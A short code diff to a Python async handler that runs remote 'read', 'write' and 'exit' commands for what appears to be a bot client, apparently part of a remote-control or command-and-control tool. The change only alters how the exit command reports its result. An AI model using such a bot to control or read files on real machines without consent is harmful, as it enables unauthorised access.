@@ -66,11 +66,9 @@ async def execute_command(session: ClientSession, command: dict[str, Any]) -> No
             result = await read_file(command)
         elif command["action"] == "write":
             result = await write_file(command)
-        # exiting requires special handling, return early
         elif command["action"] == "exit":
             await exit_bot()
-            await return_result(session, f"Bot Exited".encode())
-            return
+            result = f"Bot {ID} Exited".encode()
         else:
             result = f"unknown action: {command['action']}".encode()
 
